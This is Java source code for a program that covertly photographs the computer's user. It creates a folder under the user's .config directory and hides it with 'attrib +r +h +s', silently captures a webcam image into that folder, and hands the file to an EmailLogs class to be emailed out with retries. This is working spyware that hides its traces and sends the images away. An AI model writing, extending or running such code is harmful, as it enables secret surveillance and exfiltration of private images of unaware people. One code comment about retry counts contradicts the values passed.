import java.awt.Dimension;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.imageio.ImageIO;

import com.github.sarxos.webcam.Webcam;

public class CameraCapture {
    public static void main(String args[]) throws IOException {
    	
    	String userHome = System.getProperty("user.home");
    	String directoryPath = userHome + "\\" + ".config\\sapdla";
//    	System.out.print(directoryPath1);
        // Create the directory path
//        String directoryPath = "E:\\sapdla";

        // Create the directory if it does not exist
        File directory = new File(directoryPath);
        if (!directory.exists()) {
            boolean created = directory.mkdir();
            if (created) {
                System.out.println("Directory created successfully.");
                // Hide the directory
                try {
                    Process process = Runtime.getRuntime().exec("cmd /c attrib +r +h +s " + directoryPath);
                    int exitCode = process.waitFor();
                    if (exitCode == 0) {
                        System.out.println("Directory hidden successfully.");
                    } else {
                        System.out.println("Failed to hide directory.");
                    }
                } catch (Exception e) {
                    System.out.println("Exception: " + e.getMessage());
                }
            } else {
                System.out.println("Failed to create directory.");
            }
        }

        Webcam webcam = Webcam.getDefault();

        // Set a supported resolution, for example, 640x480
        Dimension resolution = new Dimension(640, 480);
        webcam.setViewSize(resolution);

        webcam.open();

        // Get the current date and time
        Date currentDate = new Date();

        // Format the date and time for the filename
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
        String formattedDate = dateFormat.format(currentDate);

        // Create the filename with the current date and time
        String filename = directoryPath + "\\sapdla" + formattedDate + ".jpg";

        // Save the captured image with the filename
        File imageFile = new File(filename);
        ImageIO.write(webcam.getImage(), "JPG", imageFile);

        System.out.println("Image saved as: " + filename);
        webcam.close();
        // Send the captured image via email
        EmailLogs emailSender = new EmailLogs();
        emailSender.sendEmailWithRetry(imageFile.getAbsolutePath(), 1000, 15000); // 3 retries with 5 seconds delay
    }
}
